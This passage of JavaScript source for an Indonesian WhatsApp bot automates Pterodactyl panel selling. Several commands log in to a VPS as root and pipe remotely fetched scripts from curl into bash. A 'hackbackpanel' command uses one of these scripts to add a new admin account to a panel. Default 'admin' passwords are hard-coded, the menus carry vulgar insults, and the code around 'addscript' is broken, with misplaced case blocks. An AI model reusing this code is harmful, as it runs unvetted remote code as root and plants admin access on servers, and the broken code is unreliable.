let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285183671661\n');
stream.write('https://whatsapp.com/channel/0029Vb6M1WF1t90UFHjmpH35\n');
stream.write('https://whatsapp.com/channel/0029Vb6M1WF1t90UFHjmpH35\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
            
case 'niatsholat': {
 if (!q) return m.reply(`\`</> Format Salah Contoh :\`\nniatsholat Subuh`)
const niatsholat = [
 {
 index: 1,
 solat: "subuh",
 latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 2,
 solat: "maghrib",
 latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 3,
 solat: "dzuhur",
 latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 4,
 solat: "isha",
 latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
 },
 {
 index: 5,
 solat: "ashar",
 latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
 arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
 translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
 }
]
 let text = q.toLowerCase() || ''
 let data = Object.values(niatsholat).find(v => v.solat == text)
 if (!data) return m.reply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
 reply(`
_*Niat Sholat ${text}*_

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}

break

case 'ayatkursi': {
 let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
m.reply(caption)
}
break

//=====
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Kenz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Kenz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Kenz\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Kenz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//===>
case 'npm': case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	Kenz.sendMessage(m.chat, {
		react: {
			text: '⚙️',
			key: m.key,
		}
	})
	let { objects } = await res.json()
	if (!objects.length) return reply(`Query "${text}" not found :/`)
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	reply(`乂 *N P M  S E A R C H*\n\n` + txt)
}
break
//================================================================================

case 'menu-panelv2':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Pupuler Sepanjang Masa",
 rows: [{
 header: 'Add Premium',
 title: "Menampilkan Fitur Add Premium",
 description: `© Kenz-Satoru`,
 id: `.addprem`
  }]}, {
 highlight_label: "",
 rows: [{
 header: 'Dellete Premium',
 title: "menampilkan Fitur Dellete Premium",
  description: `© Kenz-Satoru`,
 id: `.dellprem`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'List Premium',
 title: "menampilkan Semua Premium",
  description: `© Kenz-Satoru`,
 id: `.listprem`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Create Admin V2',
 title: "menampilkan Fitur Membuat Admin Panel V2",
  description: `© Kenz-Satoru`,
 id: `.cadmin-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'List Admin Panel V2',
 title: "Menampilkan Semua Admin Panel V2",
  description: `© Kenz-Satoru`,
 id: `.listadmin-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Dellete Admin V2',
 title: "Menampilkan Fitur Hapus Admin Panel V2",
  description: `© Kenz-Satoru`,
 id: `.deladmin-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Create Panel V2',
 title: "menampilkan Fitur Membuat Panel V2",
  description: `© Kenz-Satoru`,
 id: `.cpanel-v2`
  }]}, {
 highlight_label: "",
 rows: [{
 header: 'Membuat Panel Per Gb',
   title: "Menampilkan Fitur Panel 1gb - Unli",
  description: `© Kenz-Satoru`,
 id: `.panelgb-v2`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Panel Versi 2",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break
case 'menu-otomatis':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Pupuler Sepanjang Masa",
 rows: [{
 header: 'Buy Panel Pterodactyl',
 title: "menampilkan menu Buy Pterodactyl",
 description: `Cocok Buat Lu Yang Suka Make Bot WhatsApp/Telegram`,
 id: `.buypanel`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Panel Private',
 title: "menampilkan menu Buy Panel Private",
 description: `Cocok Buat Lu yg Takut Kemalingan Sc`,
 id: `buypanelprivate`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Panel Public',
 title: "menampilkan menu Buy Panel Public",
 description: `Cocok Buat Lu yg Mau Panel Harga Murah`,
 id: `buypanelpublic`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Vps ( Virtual Server Private )',
 title: "Menampilkan Pembelian Vps Otomatis",
 description: `Cocol Buat Lu Yang Suka Jualan Panel`,
 id: `.buyvps`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Admin Panel',
 title: "menampilkan Pembelian Admin Panel",
 description: `Cocok Buat Lu yg Open Reseller`,
 id: `.buyadminpanel`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Buy Partner Panel',
 title: "Menampilkan Pembelian Partner Panel",
 description: `Cocok Buat Lu yg Open admin panel/reseller  `,
 id: `buypartnerpanel`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Buy Owner Panel',
 title: "Menampilkan Pembelian Owner Panel",
 description: `Baguss Dah Pokoknya`,
 id: `.buyownerpanel`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Buy Script Bot WhatsApp',
 title: "menampilkan List Script",
 description: `Script Bot WhatsApp Yang Canggih `,
 id: `.listsc`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Buy Reseller Subdomain',
   title: "Menampilkan Pembelian Reseller Subdomain",
 description: `Cocok Buat Lu Yg Open Jasa Install Panel`,
 id: `.buyressubdomain`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Buy Reseller Panel Private',
 title: "Menampilkan Pembelian Reseller Panel Private",
 description: `Reseller Panel Privat Server Terjaga`,
 id: `.buyresprivate`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Buy Reseller Panel Public',
 title: "Menampilkan Pembelian Reseller Panel Public",
 description: ``,
 id: `buyrespublic`
 }]},{
 highlight_label: "",
 rows: [{
 header: '😈Owner😈',
 title: "Nomor Owner Botz",
 description: ``,
 id: `.owner`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "Menu List",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break

case "buyresellerpanel": {
    // Ensure the purchase only happens in private chat
    if (m.isGroup) {
        return Kenz.sendMessage(m.chat, {text: "Pembelian Reseller Panel hanya bisa dilakukan di private chat."});
    }

    // Check if there is an ongoing transaction
    if (db.users[m.sender].status_deposit) {
        return Kenz.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }

    // Inform the user how to proceed with the purchase
    let teks = `
    \`Untuk membeli Reseller Panel, ketik perintah berikut:\`
    Contoh penggunaan: *.buyresellerpanel 1*
    Pilihan: 1 (Rp 5000)
    `;
    if (!text) return Kenz.sendMessage(m.chat, {text: teks});

    let Obj = {};
    let cmd = text.toLowerCase();
    if (cmd === "1") {
        Obj.harga = "10000"; // Harga untuk Reseller Panel
    } else {
        return Kenz.sendMessage(m.chat, {text: teks});
    }

    // QRIS Order URL
    const UrlQr = global.qrisOrderKuota;

    // Function to generate a random value for payment amount
    let amount = Number(Obj.harga) + Math.floor(Math.random() * (250 - 110 + 1)) + 110;
    
    // Create payment request
    const get = await axios.get(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`);
const formattedTime = `${hours}:${minutes}`;
    
    // Message to user with payment info and QR code
    const teks3 = `
    *🛒 DETAIL PEMBELIAN RESELLER PANEL*\n\n*Harga*: Rp. ${Obj.harga}\n\nSilahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.`;
    
    // Send payment QR and information to user
    let msgQr = await Kenz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m});
    
    // Update user status and store payment data
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000); // 5 minutes expiry
        }
    };

    // Start payment expiration timer
    await db.users[m.sender].saweria.exp();

    // Check payment status until the user has completed the payment or the time expires
    while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(15000); // Wait 15 seconds before checking payment status

        // Check payment status
        const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;

        // If payment matches the expected amount, process the order
        if (db.users[m.sender].saweria && req === db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            clearInterval(db.users[m.sender].saweria.exp);

            // Send payment confirmation to user
            await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: `
            *PEMBAYARAN BERHASIL DITERIMA ✅*

            *• ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            *• Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            *• Barang:* Reseller Panel Pterodactyl
            *• Payment:* ${resultcek.data.brand_name}
            `}, {quoted: db.users[m.sender].saweria.msg});

            // Send access details to the user (without creating admin panel)
            let orang = db.users[m.sender].saweria.chat;
            let teksKenz = `*💸 Pembayaran Sukses! 🎉*

✨ Terima kasih atas pembelian Anda! Berikut ini adalah detail grup reseller yang Anda beli:

🌟 *Link Grup :* isii link grup luu
📌 *Harga Reseller Panel:* ${Obj.harga}

🚀 *Selamat bergabung dan semoga sukses dalam bisnis Anda!*
Jika ada pertanyaan, jangan ragu untuk menghubungi kami. 💬

_“Kesuksesan adalah hasil dari kerja keras, semangat, dan peluang yang dimanfaatkan dengan baik!”_
`;

            await Kenz.sendMessage(orang, {text: teksKenz}, {quoted: null});
            await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break

case 'listsc': {
if (!global.scripts || global.scripts.length === 0) {
return m.reply('📂 Tidak ada script yang tersedia. Tambahkan script menggunakan perintah `/addscript`.');
}

let listMessage = '*📂 Daftar Script Tersedia:*\n\n';
global.scripts.forEach((script, index) => {
listMessage += `${index + 1}. *${script.name}*\n   - Harga: Rp${script.price.toLocaleString('id-ID')}\n\n`;
});
listMessage += 'Ketik perintah: `.buysc <nomor>` untuk memesan script.';

m.reply(listMessage);
break;
}

case 'addscript': {
if (!isOwner) return m.Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

    let teks = `
    ❌ *Format salah!*\nGunakan perintah:\n/addscript <NamaScript> <Harga> <Link>\n\nContoh:\n/addscript RafanoV4 40000 https://mediafire.com/file.zip
    `;
}

const args = text.split(' ');

if (args.length < 3) {

return m.reply(
`❌ *Format salah!*\nGunakan perintah:\n/addscript <NamaScript> <Harga> <Link>\n\nContoh:\n/addscript RafanoV4 40000 https://mediafire.com/file.zip`
);
}        
const [name, price, ...urlArray] = args;
const url = urlArray.join(' ');
const newScript = { name, price: parseInt(price), url };

if (!global.scripts) global.scripts = [];
global.scripts.push(newScript);

m.reply(`✅ *Script baru berhasil ditambahkan!*\n\n📜 *Nama*: ${name}\n💸 *Harga*: Rp${price}\n🔗 *Link*: ${url}`);
break;
}

switch (command) {
case 'delscript': {
if (!isOwner) return m.Reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

if (!text || isNaN(text)) {
return m.reply(
`❌ *Format salah!*\nGunakan perintah:\n/delscript <NomorScript>\n\nContoh:\n/delscript 1`
);
}

const scriptIndex = parseInt(text);

if (!global.scripts || scriptIndex < 1 || scriptIndex > global.scripts.length) {
return m.Reply('❌ Nomor script tidak valid! Ketik `/listsc` untuk melihat daftar script.');
}

